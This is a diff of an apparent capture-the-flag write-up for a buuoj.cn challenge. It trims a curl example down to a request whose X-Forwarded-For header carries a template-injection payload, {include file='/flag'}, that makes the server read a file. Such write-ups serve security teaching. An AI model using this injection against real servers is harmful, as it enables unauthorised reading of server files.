@@ -20,9 +20,7 @@
 ```
 curl -X GET \
   http://web57.buuoj.cn/xff/ \
-  -H 'Postman-Token: b679a211-ca95-4c77-b6e7-0ea559c67824' \
-  -H 'X-Forwarded-For: {include file='\''/flag'\''}' \
-  -H 'cache-control: no-cache'
+  -H 'X-Forwarded-For: {include file='\''/flag'\''}'
 ```
 
 ## 版权
